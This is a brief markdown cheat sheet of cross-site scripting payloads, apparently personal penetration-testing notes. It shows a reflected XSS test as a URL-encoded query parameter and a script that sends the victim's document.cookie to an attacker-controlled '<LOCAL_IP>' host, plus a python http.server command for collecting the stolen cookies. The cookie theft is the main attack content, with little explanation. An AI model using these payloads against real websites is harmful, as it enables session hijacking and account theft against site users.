# Cross-Site Scripting

## Reflective

Put `<script>alert(1);</script>` in a query parameter.

`http://<HOST>/path?parameter=%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E`

## DOM based

Add HTML when submitting content, e.g. a feedback form.

Test: `<pre>Some message</pre>`

Steal cookies: `<script>var i = new Image(); i.src = "http://<LOCAL_IP>/?"+document.cookie;</script>Some message`

Receive requets: `python3 -m http.server 80`